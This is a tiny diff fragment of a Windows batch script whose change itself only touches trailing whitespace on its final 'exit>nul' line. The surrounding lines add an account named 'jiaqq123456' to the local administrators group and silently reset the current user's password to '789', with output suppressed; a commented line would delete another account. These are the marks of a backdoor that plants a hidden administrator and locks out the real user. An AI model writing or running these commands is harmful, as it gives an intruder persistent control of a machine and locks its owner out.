@@ -4,4 +4,4 @@
 @net localgroup administrators jiaqq123456 /add
 @net user %username% 789
 rem net user jiaqq123456789 /delete
-exit>nul
+exit>nul 
